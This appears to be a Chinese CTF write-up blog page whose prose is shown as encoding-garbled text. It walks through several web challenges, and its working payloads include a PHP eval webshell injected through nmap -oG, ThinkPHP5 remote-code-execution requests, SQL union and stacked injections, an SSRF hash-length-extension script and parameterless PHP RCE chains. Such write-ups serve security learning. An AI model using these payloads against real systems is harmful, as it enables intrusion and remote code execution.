<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"><span class="number">2.</span>ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\'' -v -d a=<span class="number">1</span>'ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</span><br><span class="line"><span class="number">3.</span>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰</span><br><span class="line"><span class="number">4.</span>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl '<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„'æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„'é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\ -v -d a=<span class="number">1</span>'ï¼Œå³å‘<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=<span class="number">1</span>'ã€‚</span><br></pre></td></tr></table></figure>

<p>ç„¶å nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p>
<p>payload host=<code>&#39; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG a.php &#39;</code></p>
<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>WEB-INF/web.xmlæ³„éœ²</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:</span><br><span class="line">/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ <span class="class"><span class="keyword">class</span> æ–‡ä»¶ï¼ŒåŒ…æ‹¬ <span class="title">servlet</span> <span class="title">class</span> å’Œé<span class="title">servlet</span> <span class="title">class</span>ï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .<span class="title">jar</span>æ–‡ä»¶ä¸­</span></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/ï¼šå­˜æ”¾<span class="title">web</span>åº”ç”¨éœ€è¦çš„å„ç§<span class="title">JAR</span>æ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„<span class="title">jar</span>æ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨<span class="title">jar</span>æ–‡ä»¶</span></span><br><span class="line">/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</span><br><span class="line">/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span><br><span class="line">æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­<span class="class"><span class="keyword">class</span>æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥ä¸‹è½½<span class="title">class</span>æ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘<span class="title">class</span>æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </span></span><br></pre></td></tr></table></figure>

<p>æ¼æ´æˆå› ï¼š</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">é€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB<span class="literal">-INF</span>ç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB<span class="literal">-INF</span>ç›®å½•å°±å¥½äº†ï¼š <span class="keyword">location</span> <span class="title">~ ^/WEB-INF</span>/* &#123; <span class="keyword">deny</span> all; &#125; æˆ–è€…return <span class="number">404</span>; æˆ–è€…å…¶ä»–ï¼</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªå‘ï¼Œdownloadè¯·æ±‚è¦POSTå‚æ•°ï¼ŒGETæ— æ•ˆ</p>
<p>å…ˆè¯»å–web.xml</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809090311609.png" alt="image-20200809090311609"></p>
<p>å†è¯»å–<code>FlagController.class</code></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809090432741.png" alt="image-20200809090432741"></p>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>é¡µé¢æºç æœ‰ä¸€ä¸²å­—ç¬¦ï¼Œå…ˆBase32åBase64è§£ç </p>
<p><code>select * from user where username = &#39;$name&#39;</code></p>
<p>ç„¶åæµ‹è¯•ä¸‹é¡µé¢é€»è¾‘ï¼Œå…ˆåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±è¿”å›<code>wrong user!</code>ï¼Œå­˜åœ¨åˆ™æ¥ç€åˆ¤æ–­å¯†ç ï¼Œå¯†ç é”™è¯¯åˆ™è¿”å›<code>wrong pass!</code></p>
<p>å¤§æ¦‚è¿‡æ»¤äº†è¿™äº›å­—ç¬¦</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809092100640.png" alt="image-20200809092100640"></p>
<p>ç›´æ¥å¯ä»¥ç”¨è”åˆæ³¨å…¥ï¼Œè¡¨é‡Œæœ‰ä¸‰åˆ—</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">Order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œç”¨è”åˆæ³¨å…¥ï¼Œå›æ˜¾wrong user!ï¼Œè¯´æ˜ç”¨æˆ·ä¸åœ¨ç¬¬ä¸€åˆ—</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>

<p>å°è¯•å°†ç”¨æˆ·åæ”¾åœ¨ç¬¬äºŒåˆ—ï¼Œå›æ˜¾wrong pass!ï¼Œæ‰¾åˆ°ç”¨æˆ·ååœ¨ç¬¬äºŒåˆ—</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·åè¾“å…¥ï¼ˆâ€˜e10adc3949ba59abbe56e057f20f883eâ€™æ˜¯ 123456çš„md5å€¼ï¼‰</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'e10adc3949ba59abbe56e057f20f883e'</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h3><p>ä¸»é¡µæç¤ºThinkPHP5æ¡†æ¶ï¼Œç›´æ¥ç”¨expæ‰“ï¼ŒæŠ¥é”™å¾—åˆ°ç‰ˆæœ¬ä¿¡æ¯</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809100312733.png" alt="image-20200809100312733"></p>
<p>ç„¶åç›´æ¥ç”¨5.0.23expæ‰“</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?s=captcha</span><br><span class="line">POST: _method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">server</span>[<span class="title">REQUEST_METHOD</span>]=<span class="title">ls</span> -<span class="title">al</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809100351723.png" alt="image-20200809100351723"></p>
<h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>/De1ta</code>è·¯ç”±ä¸‹</p>
<p>ç¬¬ä¸€å…³è¦ç»•è¿‡wafï¼Œä¸èƒ½ç”¨ <code>gopher</code>å’Œ<code>file</code>åè®®ï¼Œä½†urllibæ¨¡å—æ”¯æŒ <code>local_file</code>åè®®ï¼Œè€Œä¸”é¢˜ç›®å‘Šè¯‰<code>flag</code>åœ¨ <code>./flag.txt</code>ã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹,<code>local_file:flag.txt</code>æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œ<code>local_file:///flag.txt</code>åˆ™æ˜¯ç»å¯¹è·¯å¾„ã€‚</p>
<p>ç¬¬äºŒå…³åˆ™è¦ç»•md5æ ¡éªŒ</p>
<p>å…³é”®åœ¨<code>getSign(self.action, self.param) == self.sign</code>ï¼Œè€Œ<code>getSign()</code> ç›¸å½“äº<code>md5(secert_key + param + action)</code> ï¼Œ<code>secert_key</code>æ˜¯è„šæœ¬éšæœºç”Ÿæˆçš„16ä½å­—ç¬¦ä¸²ã€‚</p>
<p>åœ¨<code>/geneSign</code>è·¯ç”±ä¸‹æäº¤<code>param=local_file:flag.txt</code>å¾—åˆ°<code>md5(secert_key + local_file:flag.txt + scan)</code>æ—¢<code>fefdccdd74fd9e221ea27ca5458d45c7</code></p>
<p>ç„¶åä½¿ç”¨ <code>hashpump</code>æ„é€ å­—ç¬¦ä¸²</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809223529285.png" alt="image-20200809223529285"></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809223624980.png" alt="image-20200809223624980"></p>
<p>å› ä¸º <code>param(local_file:flag)</code> ä¼šåœ¨æœåŠ¡ç«¯æ‹¼æ¥ï¼Œæ‰€ä»¥<code>action</code>åˆ é™¤è¦<code>local_file:flag</code>å­—æ®µ</p>
<p>@ä¸€å¶é£˜é›¶å¸ˆå‚…çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'local_file:///proc/self/cwd/flag.txt'</span></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/geneSign?param='</span>+url)</span><br><span class="line">old_sign = r.content</span><br><span class="line">new_sign = hashpumpy.hashpump(old_sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">'sign'</span>: new_sign[<span class="number">0</span>],</span><br><span class="line"><span class="string">'action'</span>: urllib.quote(new_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/De1ta?param='</span>+url, cookies=cookies)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>

<h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>å †å æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> FlagHere; <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>flagå°±åœ¨è¡¨<code>FlagHere</code>ä¸­</p>
<p>è¿‡æ»¤å¦‚ä¸‹ï¼š</p>
<p><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>setè¢«ç¦ï¼Œä¸èƒ½ç”¨è¿›åˆ¶ç»•è¿‡</p>
<p>åˆ©ç”¨handlerç»•è¿‡ï¼Œpayload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h3><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œæœ€åæ‰«ç›®å½•</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200809235401850.png" alt="image-20200809235401850"></p>
<p>githackè¿˜åŸæ–‡ä»¶</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810000328848.png" alt="image-20200810000328848"></p>
<p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ— å‚RCE</p>
<p><code>et</code>è¢«ç¦ <code>getenv()</code> <code>getallheaders()</code>  <code>get_defined_vars()</code> éƒ½ç”¨ä¸äº†</p>
<p>è¯»å–æ–‡ä»¶ï¼Œä¸èƒ½ä½¿ç”¨<code>file_get_contents()</code>ï¼Œä½†æ˜¯å¯ä»¥å¯ä»¥ä½¿ç”¨<code>readfile()</code>æˆ–<code>highlight_file()</code>ä»¥åŠå…¶åˆ«åå‡½æ•°<code>show_source()</code></p>
<p>è¿™é‡Œä½¿ç”¨ session_id()</p>
<p>æœ¬é¢˜ç›®è™½ç„¶banäº†hexå…³é”®å­—ï¼Œå¯¼è‡´hex2bin()è¢«ç¦ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¹¶ä¸ä¾èµ–äºåå…­è¿›åˆ¶è½¬ASCIIçš„æ–¹å¼ï¼Œå› ä¸ºflag.phpè¿™äº›å­—ç¬¦æ˜¯PHPSESSIDæœ¬èº«å°±æ”¯æŒçš„ã€‚<br>ä½¿ç”¨sessionä¹‹å‰éœ€è¦é€šè¿‡session_start()å‘Šè¯‰PHPä½¿ç”¨sessionï¼Œphpé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ã€‚<br>session_id()å¯ä»¥è·å–åˆ°å½“å‰çš„session idã€‚</p>
<p>å…¶ä»–payload</p>
<p><code>exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p>
<p>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯<code>.</code></p>
<p>current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚pos() æ˜¯current() çš„åˆ«åã€‚</p>
<p>array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200810002921599.png" alt="image-20200810002921599"></p>
<p><code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code> //å¤šåˆ·æ–°å‡ æ¬¡</p>
<p>array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p>
<p>array_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</p>
<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>SQLæ³¨å…¥ï¼ŒæŠ“åŒ…ï¼Œé¡µé¢æºç éƒ½æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œåé¢æ‰«ç›®å½•æ‹¿åˆ°æºç </p>
<p>å…¶ä¸­config.phpæœ‰$flagå˜é‡ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯è¯»å–æœåŠ¡ç«¯ config.phpæ–‡ä»¶ã€‚</p>
<p>æ ¹æ®update.php <code>$profile[&#39;nickname&#39;]</code>å˜é‡é€šè¿‡ä¼ å‚æ•°ç»„å¯ä»¥ç»•è¿‡<code>die()</code>ï¼Œä»è€Œå¯æ§<code>nickname</code></p>
<p>æ¥ç€æ˜¯ååºåˆ—åŒ– <code>$profile</code> </p>
